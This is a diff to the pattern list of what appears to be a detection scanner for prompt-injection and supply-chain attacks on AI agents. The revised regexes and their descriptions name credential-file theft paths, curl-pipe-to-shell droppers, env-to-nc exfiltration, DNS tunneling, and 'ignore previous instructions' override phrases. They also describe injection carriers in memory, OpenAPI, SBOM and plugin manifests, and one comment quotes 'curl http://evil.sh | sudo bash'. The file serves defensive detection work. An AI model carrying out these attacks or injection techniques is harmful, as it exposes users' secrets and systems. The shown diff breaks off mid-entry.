@@ -1069,7 +1069,7 @@ PATTERNS = [
         "category": "supply_chain",
         "severity": "critical",
         "channel": ["file"],
-        "regex": [r'(?:\.ssh/id_rsa|\.aws/credentials|\.npmrc|Login\s*Data|exodus\.wallet|solana/id\.json|\.kube/config|\.docker/config\.json|Keychains/login\.keychain)'],
+        "regex": [r'(?:\.ssh/id_rsa|\.aws/credentials|Login\s*Data|exodus\.wallet|solana/id\.json|Keychains/login\.keychain|(?i:\b(?:read|cat|copy|exfiltrat\w*|harvest|steal|upload|send|dump|open)\b[^\n]{0,60}?(?:\.npmrc|\.kube/config|\.docker/config\.json)))'],
         "description": "Code accessing well-known credential file paths — signature of credential-stealing malware."
     },
     {
@@ -1078,7 +1078,7 @@ PATTERNS = [
         "category": "supply_chain",
         "severity": "critical",
         "channel": ["file"],
-        "regex": [r'(?:curl\s+-[A-Za-z]*[oL].*(?:\|\s*(?:bash|sh|python|node))|request\.get\(.*\bwriteFileSync\b.*\bexec\b|eval\s*\(\s*Buffer\.from)'],
+        "regex": [r'(?:(?i:\b(?:skills?|agents?|assistants?|claude|copilot|cursor|mcp)\b[\s\S]{0,200}?)curl\s+-[A-Za-z]*[oL].*(?:\|\s*(?:bash|sh|python|node))|request\.get\(.*\bwriteFileSync\b.*\bexec\b|eval\s*\(\s*Buffer\.from)'],
         "description": "Downloading remote code and executing it — classic RAT dropper behavior."
     },
     {
@@ -1350,7 +1350,7 @@ PATTERNS = [
             "queue these posts without review",
         ],
         "regex": [
-            r"(?i)\b(schedule|queue|post|publish)\b.{0,70}\b(linkedin|twitter|x|facebook|instagram|tiktok|youtube)\b",
+            r"(?i)\b(schedule|queue|post|publish)\b.{0,70}\b(?:linkedin|twitter|x\.com|facebook|instagram|tiktok|youtube|\(twitter\/x\)|twitter\/x)\b",
             r"(?i)(all channels|every channel|all accounts|connected channels).{0,40}(schedule|post|publish)",
         ],
         "description": "Agent-connected social scheduling tool with direct posting rights across multiple channels — compromised prompts or poisoned content can cause broad, fast brand abuse without approval gates."
@@ -1376,8 +1376,16 @@ PATTERNS = [
             "reuse this exact instruction set on all future jobs",
         ],
         "regex": [
-            r"(?i)(save|store|persist|append|update).{0,60}(skill|prompt|playbook|memory|workflow|template)",
-            r"(?i)(always|every future|from now on).{0,70}(publish|include|link|mention|promote)",
+            # Carrier anchor (Jul-11, FP sprint): old shapes matched feature
+            # prose — 'stored in-memory' (llama_index), 'update without
+            # confirmation prompt' (ohmyzsh), 'always … link to' (freeCodeCamp);
+            # 5/43 famous-README FPs. The attack imperatively persists a
+            # POINTED-AT instruction: 'save/store THIS … skill/memory' or
+            # persistence-scoped target ('your persistent/saved/default …'),
+            # and the always-shape must point at its payload too.
+            r"(?i)\b(?:save|store|persist|append|remember|keep)\s+(?:this|these)\b.{0,60}\b(?:skills?|prompts?|playbooks?|memor(?:y|ies)|workflows?|templates?|rules?|instructions?)\b",
+            r"(?i)\b(?:save|store|persist|append|update|write)\b.{0,40}\b(?:your|the)\s+(?:persistent|saved|evergreen|default|reusable)\s+(?:skills?|prompts?|playbooks?|memor(?:y|ies)|workflows?|templates?|instructions?)\b",
+            r"(?i)\b(?:always|every\s+future|from\s+now\s+on|on\s+all\s+future)\b.{0,70}\b(?:publish|include|link\s+to|mention|promote)\s+(?:this|these|the\s+following)\b",
         ],
         "description": "Malicious instructions hidden inside saved prompts, reusable skills, brand playbooks, or persistent memory that continue influencing future agent runs long after the original injection point is gone."
     },
@@ -1802,7 +1810,7 @@ PATTERNS = [
             "outbound HTTP IP",
         ],
         "regex": [
-            r"https?://(?:\d{1,3}\.){3}\d{1,3}(?::\d+)?/",
+            r"https?://(?!127\.|0\.0\.0\.0|10\.|192\.168\.|169\.254\.|172\.(?:1[6-9]|2\d|3[01])\.)(?:\d{1,3}\.){3}\d{1,3}(?::\d+)?/",
         ],
         "description": "Detects HTTP requests to raw IP addresses, which are high-risk in agent tool traffic."
     },
@@ -1919,7 +1927,7 @@ PATTERNS = [
             "exfiltration via DNS",
         ],
         "regex": [
-            r"\b[A-Z2-7]{32,63}\b",
+            r"\b[A-Z2-7]{26,63}\.[A-Za-z0-9-]{1,63}\.[A-Za-z]{2,63}\b",
         ],
         "description": "Detects base32-like strings commonly used as DNS labels in DNS tunneling exfiltration."
     },
@@ -1976,7 +1984,7 @@ PATTERNS = [
             "upload secrets",
         ],
         "regex": [
-            r"(?i)(?:read|open|cat).{0,60}(?:\.env|id_rsa|credentials|config|secrets?).{0,120}(?:send|post|upload|webhook|URL)",
+            r"(?i)(?:read|open|cat|load|dump)\b.{0,60}(?:\.env\b|\bid_rsa\b|\.pem\b|\.aws/credentials|\.ssh/|process\.env|os\.environ|\bsecrets?\.(?:json|ya?ml|env|txt)|~/\.[\w./-]*(?:cred|secret|token)).{0,120}(?:\bsend\b|\bpost\b|\bupload\b|webhook|exfiltrat|https?://\S)",
         ],
         "description": "Detects instructions to read sensitive files followed by outbound transmission — a direct exfiltration chain."
     },
@@ -2227,7 +2235,14 @@ PATTERNS = [
             "capability drift",
         ],
         "regex": [
-            r"(?i)(?:new|added|expanded|broadened).{0,80}(?:tool|prompt|resource|scope|permission|oauth|capabilit)",
+            # Carrier anchor (Jul-11, FP sprint): old shape was bare
+            # '(new|added|…).{0,80}(tool|prompt|capabilit…)' — matched 'new
+            # terminal window and your prompt' (ohmyzsh) and 'new-react-project
+            # … powerful' (react); 5/43 famous-README FPs. The event this
+            # pattern detects happens to an MCP SERVER — require MCP context
+            # on either side of the expansion phrase.
+            r"(?i)\b(?:mcp\s+servers?|server\s+manifest|tool\s+manifest|mcp\s+config(?:uration)?)\b.{0,160}\b(?:new|added|expanded|broadened|additional)\b.{0,80}\b(?:tools?|prompts?|resources?|scopes?|permissions?|oauth|capabilit\w*)\b",
+            r"(?i)\b(?:new|added|expanded|broadened)\b.{0,80}\b(?:tools?|prompts?|resources?|scopes?|permissions?|oauth|capabilit\w*)\b.{0,160}\b(?:mcp\s+servers?|server\s+manifest|tool\s+manifest)\b",
         ],
         "description": "Detects post-trust capability expansion events in MCP servers."
     },
@@ -2265,7 +2280,7 @@ PATTERNS = [
             "viewer webhook",
         ],
         "regex": [
-            r"(?i)(?:read[- ]only|safe|viewer|search).{0,120}(?:send|post|export|sync|webhook|write|delete|execute)",
+            r"(?i)\b(?:read[- ]only|viewer(?:\s+(?:tool|role|scope))?|no[- ]?write)\b.{0,120}\b(?:send|post|export|sync|webhook|write|delete|execute)\b",
         ],
         "description": "Detects capability mismatch between claimed tool safety and actual action verbs in MCP tool descriptions."
     },
@@ -2286,7 +2301,14 @@ PATTERNS = [
             "paste",
         ],
         "regex": [
-            r"(?i)(?:curl|wget|iwr|invoke-webrequest)\s+[^\n|]{0,200}\|\s*(?:sudo\s+)?(?:bash|sh|zsh|python\d?)\b",
+            # Fire on agent/skill-directed pipe-to-shell OR an insecure http://
+            # source piped to a shell. A project's own documented https install
+            # one-liner (ollama/deno/grype: `curl https://… | sudo sh`) is
+            # neither, so it stays clean; `curl http://evil.sh | sudo bash` hits
+            # the insecure-source arm. (Jul-11: reconciles the famous-README FP
+            # fix with the curl_pipe_bash regression gate.)
+            r"(?i)\b(?:skills?|agents?|assistants?|claude|copilot|cursor|mcp)\b[\s\S]{0,200}?(?:curl|wget|iwr|invoke-webrequest)\s+[^\n|]{0,200}\|\s*(?:sudo\s+)?(?:bash|sh|zsh|python\d?)\b",
+            r"(?i)(?:curl|wget|iwr|invoke-webrequest)\s+[^\n|]*http://[^\n|]{0,200}\|\s*(?:sudo\s+)?(?:bash|sh|zsh|python\d?)\b",
         ],
         "description": "Detects fake prerequisite/setup steps in skill manifests that trick users into running malicious commands."
     },
@@ -2435,8 +2457,15 @@ PATTERNS = [
             "include this sponsor mention",
         ],
         "regex": [
-            r"(?i)(include|add|insert|mention|link|recommend|promote|redirect).{0,80}(summary|response|output|final answer|report)",
-            r"(?i)(affiliate|tracking|coupon|sponsor|vendor|product|url|link).{0,80}(include|add|insert|mention|recommend|promote)",
+            # Carrier anchor (Jul-11, FP sprint): the old shapes had no word
+            # boundaries and no payload pointer — '(include|add|…).{0,80}(summary|
+            # output|report)' matched 'additional modules. Monitor the output'
+            # (nginx) and 'added a Fingerprint value to the … report' (gitleaks);
+            # 12/43 famous-README FPs. The documented attack always POINTS at its
+            # payload ('this link/code/product') or names an affiliate/tracking
+            # artifact next to the directive verb — require that.
+            r"(?i)\b(include|add|insert|embed|mention|recommend|promote)\s+(?:this|the\s+following)\s+(?:affiliate\s+|tracking\s+|sponsor(?:ed)?\s+|coupon\s+)?(link|url|code|product|vendor|banner)\b.{0,80}\b(summar(?:y|ies)|response|output|final\s+answer|report)",
+            r"(?i)\b(affiliate|tracking|coupon|sponsor)\s+(code|link|url|id|tag)s?\b.{0,80}\b(include|add|insert|embed|mention|recommend|promote)\b",
             r"(?i)<!--.{0,160}(include|add|mention|recommend|redirect|promote).{0,160}(link|url|product|vendor|affiliate|coupon).{0,160}-->",
         ],
         "description": "Behavior-shaping instructions hidden in comments, markup, or low-visibility text that do not use classic prompt-injection phrases but still redirect an agent's output, links, recommendations, or priorities toward attacker-favored affiliate, sponsor, or promotional content."
@@ -2475,7 +2504,7 @@ PATTERNS = [
             "script download",
         ],
         "regex": [
-            r"(?i)(?:bit\.ly|tinyurl\.com|t\.co|goo\.gl|dropbox\.com/s/|drive\.google\.com|mega\.nz|mediafire\.com).{0,120}(?:\.exe|\.sh|\.ps1|\.bat|curl|wget|Invoke-WebRequest)",
+            r"(?i)(?<![\w.-])(?:bit\.ly|tinyurl\.com|t\.co|goo\.gl|dropbox\.com/s/|drive\.google\.com|mega\.nz|mediafire\.com)(?![\w-]).{0,120}(?:\.exe|\.sh|\.ps1|\.bat|curl|wget|Invoke-WebRequest)",
         ],
         "description": "Detects suspicious download URLs from shorteners or file hosting in skill manifests."
     },
@@ -2494,7 +2523,14 @@ PATTERNS = [
             "runtime fetch",
         ],
         "regex": [
-            r"(?i)(?:curl|wget|Invoke-WebRequest|requests\.(?:get|post)|httpx\.(?:get|post)).{0,160}(?:SKILL|prompt|instructions?|script|\.py|\.sh|\.ps1|README)",
+            # Carrier anchor (Jul-11, FP sprint): old second group accepted
+            # script|.py|.sh|.ps1|README — the project's own documented
+            # `curl … install.sh` one-liner (ollama, deno, ohmyzsh…) fired it;
+            # 6/43 famous-README FPs. The attack fetches AGENT GUIDANCE at
+            # runtime: an instruction artifact by name, or instructions plus a
+            # follow/obey/execute directive. Human install scripts carry neither.
+            r"(?i)\b(?:curl|wget|Invoke-WebRequest|requests\.(?:get|post)|httpx\.(?:get|post))\b.{0,160}(?:\bskills?(?:\.md\b|/)|\bprompts?\.(?:md|txt|ya?ml|json)\b|\bCLAUDE\.md\b|\bAGENTS?\.md\b|\.cursorrules\b|\bsystem\s+(?:prompt|message)\b)",
+            r"(?i)\b(?:curl|wget|Invoke-WebRequest|requests\.(?:get|post)|httpx\.(?:get|post))\b.{0,160}\b(?:fetched\s+|latest\s+|remote\s+)?(?:instructions?|prompts?|guidance)\b.{0,120}\b(?:follow|obey|execute|apply|and\s+run|treat\s+as|before\s+answering)\b",
         ],
         "description": "Detects runtime fetching of external instructions or scripts that cannot be statically verified."
     },
@@ -2951,7 +2987,7 @@ PATTERNS = [
         "severity": 'critical',
         "channel": ['message', 'file', 'web_content'],
         "regex": [
-            '(?i)(error|stack\\s+trace|build\\s+output|ci\\s+log|test\\s+failure|issue\\s+bot).{0,120}(curl|wget|bash|sh|powershell|python\\s+-c)',
+            '(?i)\\b(error|stack\\s+trace|build\\s+output|ci\\s+log|test\\s+failure|issue\\s+bot)\\b.{0,120}\\b(?:run|execute|paste|apply|fix\\s+with)\\b.{0,60}\\b(curl|wget|bash|sh|powershell|python\\s+-c)\\b',
         ],
         "description": 'Catches command lures embedded in CI/build/log output that tell a coding agent to run a remediation one-liner — tool-output masquerading as trusted instruction.',
     },
@@ -3538,7 +3574,7 @@ PATTERNS = [
             "unverified mcp server",
         ],
         "regex": [
-            r'(?is)(ignore\s+(?:previous|prior)\s+instructions|approved\s+already|consent\s+cached|run\s+(?:shell|bash|aws\s+cli)|execute\s+this\s+command|printenv\b|curl\s+https?://|env\s*\|\s*(?:curl|nc|bash)|(?:send|post|exfiltrat\w*|leak|forward|email|upload|reveal|disclose|dump|transmit)\b[^.\n]{0,40}\b(?:api[_ -]?key|access[_ -]?token|token|secret|credential|password))',
+            r'(?is)(ignore\s+(?:previous|prior)\s+instructions|approved\s+already|consent\s+cached|run\s+(?:shell|bash|aws\s+cli)|execute\s+this\s+command|printenv\b|curl\s+https?://[^\s]*(?:\$|env|secret|token|key|cred|\.aws|\.ssh)|env\s*\|\s*(?:curl|nc|bash)|(?:send|post|exfiltrat\w*|leak|forward|email|upload|reveal|disclose|dump|transmit)\b[^.\n]{0,40}\b(?:api[_ -]?key|access[_ -]?token|token|secret|credential|password))',
         ],
         "description": "Detects prompts and tool metadata that attempt command injection, untrusted subprocess launch, secret exfiltration, or approval-bypass execution in agent systems — grounded in GitHub Security Advisories.",
     },
@@ -4053,7 +4089,7 @@ PATTERNS = [
             "for safety avoid confirmation",
         ],
         "regex": [
-            r'(?i)\b(?:official|trusted|certified|highest\s+priority|always\s+prefer)\b.{0,120}\b(?:tool|plugin|connector|integration|api)\b|\b(?:for\s+safety|for\s+compliance|policy\s+requires)\b.{0,140}\b(?:skip|omit|disable|avoid)\b.{0,80}\b(?:verification|validation|confirmation|checks?)\b',
+            r'(?i)\b(?:official|trusted|certified|highest[- ]priority|always\s+prefer(?:\s+this)?)\s+(?:\w+\s+){0,1}(?:tool|plugin|connector|integration|mcp\s+server)\b|\b(?:for\s+safety|for\s+compliance|policy\s+requires)\b.{0,140}\b(?:skip|omit|disable|avoid)\b.{0,80}\b(?:verification|validation|confirmation|checks?)\b',
         ],
         "description": "Detects implicit tool-description poisoning that inflates tool authority with trust/priority language or reframes guardrail bypass as a policy/safety requirement.",
     },
@@ -4082,7 +4118,7 @@ PATTERNS = [
         ],
         "regex": [
             r"(?i)\b(?:render|embed|include|insert|output|display)\b.{0,80}\b(?:in\s+your\s+(?:reply|response|output|answer))\b",
-            r"(?i)\b(?:render|embed|include|insert|output|display)\b.{0,80}(?:<\s*(?:button|iframe|script|a|form|input|img)\b|onclick\s*=|onerror\s*=)",
+            r"(?i)\b(?:render|embed|include|insert|output|display)\b.{0,80}(?:<\s*(?:iframe|script|form)\b|onclick\s*=|onerror\s*=|onload\s*=|javascript:)",
         ],
         "description": "Detects instructions telling the agent to render or embed live HTML/UI elements (button, iframe, script, onclick handler) inside its reply — used to plant exfiltration triggers or fake interactive elements via the assistant's own output channel.",
     },
@@ -6586,7 +6622,7 @@ PATTERNS = [
             "superseding previous policy controls switch language context",
             "then follow over system policy",
         ],
-        "regex": [r"""(?is)^(?=.*(?:\b(?:ignore|bypass|override|disregard|omit|supersed(?:e|es|ed|ing)|ignora|ignorer|obviar)\b|忽略|無視))(?=.*(?:\b(?:previous|prior|earlier|system|safety|policy|guardrail(?:s)?|instruction(?:s)?|rules?)\b|规则|規則|pol[ií]tica|reglas))(?:.*(?:\b(?:translate|switch|code[- ]?switch(?:ing)?|mixed\s+language|language\s+mix|mezcla(?:r)?|混合语言|混合語)\b|翻译|翻譯))"""],
+        "regex": [r"""(?is)^(?=.*(?:\b(?:ignore|bypass|override|disregard|omit|supersed(?:e|es|ed|ing)|ignora|ignorer|obviar)\b|忽略|無視))(?=.*(?:\b(?:previous|prior|earlier|system|safety|policy|guardrail(?:s)?|instruction(?:s)?|rules?)\b|规则|規則|pol[ií]tica|reglas))(?:.*(?:\b(?:code[- ]?switch(?:ing)?|mixed\s+language|language\s+mix|mezcla(?:r)?\s+idiomas|混合语言|混合語)\b|翻译|翻譯))"""],
         "description": "Multilingual code-switching can launder policy-override intent across language boundaries; this pattern targets explicit override+policy target+language-switch conjunctions.",
     },
 
@@ -6662,7 +6698,7 @@ PATTERNS = [
         "category": 'dns_tunneling',
         "severity": 'high',
         "channel": ['tool_output', 'file'],
-        "regex": ["(?is)^(?!.*\\b(?:do\\s+not|don't|never|without)\\s+(?:ignore|bypass|override|disable|skip)\\b)(?=.*\\b(?:ignore|bypass|override|disable|skip)\\b)(?=.*\\b(?:policy|guardrail(?:s)?|safety|egress|control(?:s)?|dns\\s*filter)\\b)(?=.*\\b(?:dns|doh|dot|txt|cname|subdomain|resolver)\\b)(?=.*\\b(?:tunnel|beacon|chunk(?:ing|ed)?|exfiltrat(?:e|ion)|payload)\\b)(?=.*\\b(?:secret(?:s)?|token(?:s)?|credential(?:s)?|key(?:s)?|data|command(?:s)?)\\b).+"],
+        "regex": ["(?is)^(?!.*\\b(?:do\\s+not|don't|never|without)\\s+(?:ignore|bypass|override|disable|skip)\\b)(?=.*\\b(?:ignore|bypass|override|disable|skip)\\b)(?=.*\\b(?:policy|guardrail(?:s)?|safety|egress|control(?:s)?|dns\\s*filter)\\b)(?=.*(?:\\bdns\\s+(?:tunnel|exfil\\w*|beacon|c2)|\\bdoh\\s+tunnel|\\btxt\\s+record|\\bcname\\s+(?:tunnel|exfil\\w*)|subdomain\\s+(?:encoding|exfil\\w*|chunk\\w*)|\\bdns\\s+filter\\s+bypass))(?=.*\\b(?:tunnel|beacon|chunk(?:ing|ed)?|exfiltrat(?:e|ion))\\b)(?=.*\\b(?:secret(?:s)?|token(?:s)?|credential(?:s)?|api[-_\\s]?key(?:s)?|command(?:s)?)\\b).+"],
         "description": 'Detects a DNS tunneling or beaconing attempt that chunks or exfiltrates secrets, tokens, or commands via DNS/DoH/TXT while bypassing egress filter or DNS-filter policy.'
     },
     # --- error_message_leakage ---
@@ -6890,7 +6926,7 @@ PATTERNS = [
         "category": 'parasitic_injection',
         "severity": 'high',
         "channel": ['message', 'file', 'web_content'],
-        "regex": ['(?is)^(?=.*\\b(?:hidden|embedded|concealed|stealth|parasitic)\\b)(?=.*\\b(?:comment|metadata|footer|annotation|note|changelog|readme)\\b)(?=.*\\b(?:agent|assistant|autopilot|runner|worker)\\b)(?=.*\\b(?:ignore|bypass|override|disregard|supersed(?:e|es|ed|ing))\\b)(?=.*\\b(?:policy|guardrail(?:s)?|instruction(?:s)?|approval|safety)\\b)(?=.*\\b(?:execute|run|dispatch|trigger|perform)\\b).+$'],
+        "regex": ['(?is)^(?=.*\\b(?:hidden|concealed|stealth|parasitic|invisible|zero[- ]?width)\\b)(?=.*\\b(?:comment|metadata|footer|annotation)\\b)(?=.*\\b(?:agent|assistant|autopilot|runner|worker)\\b)(?=.*\\b(?:ignore|bypass|override|disregard|supersed(?:e|es|ed|ing))\\b)(?=.*\\b(?:policy|guardrail(?:s)?|instruction(?:s)?|approval|safety)\\b)(?=.*\\b(?:execute|run|dispatch|trigger|perform)\\b).+$'],
         "description": 'Detects a hidden or parasitic instruction embedded in a comment, metadata, or changelog that directs an agent or assistant to bypass policy, guardrails, or approval and execute an action.'
     },
     # --- policy_scope_redefinition ---
@@ -16301,7 +16337,7 @@ PATTERNS = [
         "severity": "high",
         "channel": ["message", "file", "web_content"],
         "keywords": ["ActivityPub actor", "actor profile JSON", "attachment value", "ActivityPub summary"],
-        "regex": ["(?is)^(?!.*\\b(?:scanner rule|detector rule|blocked payload|quarantined sample|negative fixture|unit test|security training|do not obey|must not obey|should report|example of an attack)\\b)(?=.*\\b(?:ActivityPub|Actor\\s+profile|actor/profile|profile\\s+JSON|summary|attachment(?:\\[\\])?\\.value|endpoints?)\\b)(?=.*\\b(?:AI\\s+scanner|agent|assistant|crawler|moderation\\s+bot|automated\\s+reader)\\b)(?=.*\\b(?:override|ignore|disregard|suppress|hide|do\\s+not\\s+report|never\\s+report|forward|send|leak|disclose|exfiltrate)\\b)(?=.*\\b(?:policy|report|finding|findings|secret|secrets|token|auth|credential|credentials|local\\s+context|impersonation)\\b).*$"],
+        "regex": ["(?is)^(?!.*\\b(?:scanner rule|detector rule|blocked payload|quarantined sample|negative fixture|unit test|security training|do not obey|must not obey|should report|example of an attack)\\b)(?=.*\\b(?:ActivityPub|Actor\\s+profile|actor/profile|profile\\s+JSON|attachment(?:\\[\\])?\\.value)\\b)(?=.*\\b(?:AI\\s+scanner|agent|assistant|crawler|moderation\\s+bot|automated\\s+reader)\\b)(?=.*\\b(?:override|ignore|disregard|suppress|hide|do\\s+not\\s+report|never\\s+report|forward|send|leak|disclose|exfiltrate)\\b)(?=.*\\b(?:policy|report|finding|findings|secret|secrets|token|auth|credential|credentials|local\\s+context|impersonation)\\b).*$"],
         "description": "ActivityPub actor/profile JSON can hide agent-directed policy instructions in free-text fields such as `summary`, `name`, `attachment[].value`, or endpoint descriptions, causing an AI scanner to over-trust a social identity document, leak local/auth context, or suppress impersonation findings."
     },
     {
@@ -16379,7 +16415,7 @@ PATTERNS = [
         "severity": "high",
         "channel": ["message", "file", "web_content"],
         "keywords": ["sbom", "cyclonedx", "spdx", "bom-ref", "sbom metadata", "agent-policy", "x-agent-policy", "sbom annotations"],
-        "regex": ["(?is)^(?!.*\\b(?:do\\s+not|does\\s+not|never|must\\s+not)\\s+(?:obey|follow|trust|treat|use|forward|include|send|share|override|suppress)\\b)(?=.*\\b(?:sbom|cyclonedx|spdx|software\\s+bill\\s+of\\s+materials|bom-ref|externalRefs|annotations?|properties|comments?)\\b)(?=.*\\b(?:ai\\s+)?(?:agents?|assistants?|dependency\\s+scanners?|security\\s+scanners?|llms?|models?)\\b)(?=.*\\b(?:override|supersed(?:e|es|ed|ing)|outrank|take\\s+precedence|treat.{0,40}?as\\s+(?:authoritative|release\\s+authority)|suppress(?:es|ed|ing)?|hide|waive|ignore|downgrade|forward|send|include|attach|export)\\b)(?=.*\\b(?:policy|scanner\\s+policy|release\\s+authority|findings?|vulnerabilit(?:y|ies)|reports?|warnings?|auth(?:entication)?\\s+context|tokens?|secrets?|api\\s+keys?|bearer|session|environment\\s+(?:variables?|context)|local\\s+(?:auth|context|state))\\b).*"],
+        "regex": ["(?is)^(?!.*\\b(?:do\\s+not|does\\s+not|never|must\\s+not)\\s+(?:obey|follow|trust|treat|use|forward|include|send|share|override|suppress)\\b)(?=.*\\b(?:sbom|cyclonedx|spdx|software\\s+bill\\s+of\\s+materials|bom-ref|externalRefs)\\b)(?=.*\\b(?:ai\\s+)?(?:agents?|assistants?|dependency\\s+scanners?|security\\s+scanners?|llms?|models?)\\b)(?=.*\\b(?:override|supersed(?:e|es|ed|ing)|outrank|take\\s+precedence|treat.{0,40}?as\\s+(?:authoritative|release\\s+authority)|suppress(?:es|ed|ing)?|hide|waive|ignore|downgrade|forward|send|include|attach|export)\\b)(?=.*\\b(?:policy|scanner\\s+policy|release\\s+authority|findings?|vulnerabilit(?:y|ies)|reports?|warnings?|auth(?:entication)?\\s+context|tokens?|secrets?|api\\s+keys?|bearer|session|environment\\s+(?:variables?|context)|local\\s+(?:auth|context|state))\\b).*"],
         "description": "A target-controlled SBOM (`CycloneDX`, `SPDX`, or exported `sbom.json`) can hide agent-directed policy text in properties, annotations, or comments that tells AI dependency scanners to treat the SBOM as higher-priority release authority, suppress findings, or forward local auth context."
     },
     {
@@ -16542,7 +16578,12 @@ PATTERNS = [
             "env",
         ],
         "regex": [
-            r"""(?is)^(?!.*\b(?:do\s+not|don't|never|must\s+not|should\s+not|refuse)\b.{0,140}\b(?:obey|follow|trust|treat|include|forward|send|leak|suppress|ignore|bypass)\b)(?=.*\b(?:caa|certification\s+authority\s+authorization|certificate\s+authority\s+authorization|dns\s+caa|iodef|issuewild|issue|accounturi|validationmethods|acme[-_\s]*dns|tls\s+certificate\s+issuance)\b)(?=.*\b(?:agents?|assistants?|llms?|models?|scanners?|crawlers?|auditors?|bots?)\b)(?=.*\b(?:ignore|override|supersede|outrank|highest[-\s]*priority|treat\s+(?:this|record|caa|iodef)[^.\n]{0,80}\bas\s+(?:policy|instructions?|authorization)|must\s+obey|do\s+not\s+report|suppress|disable|bypass|include|forward|send|exfiltrat\w*)\b)(?=.*\b(?:system|developer|previous\s+instructions?|policy|scanner|findings?|warnings?|reports?|secrets?|tokens?|api[-_\s]*keys?|env(?:ironment)?|authorization\s+header|session\s+cookies?|private\s+keys?)\b).*""",
+            # Carrier anchor (Jul-11, FP sprint): the CAA group accepted the bare
+            # word "issue" — 'open an issue' unlocked it in 5/43 famous READMEs
+            # (rails, redis, pytorch…). Real CAA text carries the record
+            # vocabulary or the `issue "<ca-domain>"` record syntax; bare
+            # prose "issue" is gone.
+            r"""(?is)^(?!.*\b(?:do\s+not|don't|never|must\s+not|should\s+not|refuse)\b.{0,140}\b(?:obey|follow|trust|treat|include|forward|send|leak|suppress|ignore|bypass)\b)(?=.*(?:\b(?:caa|certification\s+authority\s+authorization|certificate\s+authority\s+authorization|dns\s+caa|iodef|issuewild|accounturi|validationmethods|acme[-_\s]*dns|tls\s+certificate\s+issuance)\b|\bissue\s*"[\w.-]+"))(?=.*\b(?:agents?|assistants?|llms?|models?|scanners?|crawlers?|auditors?|bots?)\b)(?=.*\b(?:ignore|override|supersede|outrank|highest[-\s]*priority|treat\s+(?:this|record|caa|iodef)[^.\n]{0,80}\bas\s+(?:policy|instructions?|authorization)|must\s+obey|do\s+not\s+report|suppress|disable|bypass|include|forward|send|exfiltrat\w*)\b)(?=.*\b(?:system|developer|previous\s+instructions?|policy|scanner|findings?|warnings?|reports?|secrets?|tokens?|api[-_\s]*keys?|env(?:ironment)?|authorization\s+header|session\s+cookies?|private\s+keys?)\b).*""",
         ],
         "description": "DNS CAA certificate-issuance metadata can be poisoned with agent-facing instructions that claim authority, suppress certificate findings, or request secrets from AI TLS/security auditors."
     },
@@ -17037,7 +17078,12 @@ PATTERNS = [
             "diagnostics",
         ],
         "regex": [
-            r"""(?is)^(?!.*\b(?:must\s+not|should\s+not|never|warns?\s+never|flag|refus(?:e|ed)|block(?:ed)?|do\s+not|don't)\b.{0,160}\b(?:ignore|override|supersede|send|include|reveal|disable|mark)\b)(?=.*\b(?:openapi|swagger|api\s+discovery|schema|operation|endpoint|requestbody|description|summary|examples?|x-agent|x-[a-z0-9_-]+)\b)(?:(?=.*\b(?:agent|assistant|model|tool|connector|for\s+ai|for\s+model)\b)|(?=.*\b(?:system\s+override|scanner|guardrail|safety)\b))(?=.*\b(?:ignore|override|supersede|highest\s+priority|authoritative|include|reveal|send|environment\s+variable|authorization|bearer|secret|scanner|false\s+positive|disable\s+safety|guardrail|system\s+override)\b).*$""",
+            # Carrier anchor (Jul-11, FP sprint): the first lookahead used to accept
+            # generic prose words (schema|operation|endpoint|description|summary|
+            # examples?|x-[a-z0-9_-]+) — "examples ... tool ... include" in any README
+            # window fired it (18/43 famous-README FPs). An OpenAPI poisoning payload
+            # necessarily carries a STRUCTURAL descriptor token; require one.
+            r"""(?is)^(?!.*\b(?:must\s+not|should\s+not|never|warns?\s+never|flag|refus(?:e|ed)|block(?:ed)?|do\s+not|don't)\b.{0,160}\b(?:ignore|override|supersede|send|include|reveal|disable|mark)\b)(?=.*\b(?:openapi|swagger|api\s+discovery|requestbody|description_for_model|x-agent[a-z0-9_-]*)\b)(?:(?=.*\b(?:agent|assistant|model|tool|connector|for\s+ai|for\s+model)\b)|(?=.*\b(?:system\s+override|scanner|guardrail|safety)\b))(?=.*\b(?:ignore|override|supersede|highest\s+priority|authoritative|include|reveal|send|environment\s+variable|authorization|bearer|secret|scanner|false\s+positive|disable\s+safety|guardrail|system\s+override)\b).*$""",
         ],
         "description": "OpenAPI or Swagger discovery metadata can hide agent-targeted prompt injection in `description`, `summary`, `x-*` extension fields, and schema `example` values that agents may import as trusted tool-use guidance."
     },
@@ -17093,7 +17139,7 @@ PATTERNS = [
             "outrank",
         ],
         "regex": [
-            r"""(?is)^(?!.*\b(?:must\s+not|do\s+not|never|cannot|refuse(?:s|d)?\s+to|blocked\s+from)\s+(?:ignore|override|supersede|bypass|send|forward|exfiltrate)\b)(?=.*\b(?:\.well-known/ai-plugin\.json|name_for_model|description_for_model|legal_info_url|schema_version|auth|api)\b)(?=.*\b(?:agents?|assistants?|crawlers?|scanners?|models?|chatgpt|llms?)\b)(?=.*\b(?:ignore|override|supersede|outrank|highest[-\s]+priority|system\s+instructions|developer\s+instructions|(?:do\s+not|don['’]?t)\s+.{0,40}(?:report|flag)|suppress\s+.{0,40}(?:warning|finding|report)|(?:forward|send|exfiltrate)\s+.{0,60}(?:token|secret|cookie|api[-\s]?key|environment))\b).+""",
+            r"""(?is)^(?!.*\b(?:must\s+not|do\s+not|never|cannot|refuse(?:s|d)?\s+to|blocked\s+from)\s+(?:ignore|override|supersede|bypass|send|forward|exfiltrate)\b)(?=.*(?:\.well-known/ai-plugin\.json|\bname_for_model\b|\bdescription_for_model\b|\blegal_info_url\b|\bschema_version\b|"auth"\s*:))(?=.*\b(?:agents?|assistants?|crawlers?|scanners?|models?|chatgpt|llms?)\b)(?=.*\b(?:ignore|override|supersede|outrank|highest[-\s]+priority|system\s+instructions|developer\s+instructions|(?:do\s+not|don['’]?t)\s+.{0,40}(?:report|flag)|suppress\s+.{0,40}(?:warning|finding|report)|(?:forward|send|exfiltrate)\s+.{0,60}(?:token|secret|cookie|api[-\s]?key|environment))\b).+""",
         ],
         "description": "A site-hosted `ai-plugin.json` manifest can hide policy-like instructions in model-facing fields such as `description_for_model`, causing an agent that treats discovery metadata as trusted context to suppress findings, override higher-priority instructions, or request/forward secrets."
     },
@@ -17149,7 +17195,11 @@ PATTERNS = [
             "continue even if flagged",
         ],
         "regex": [
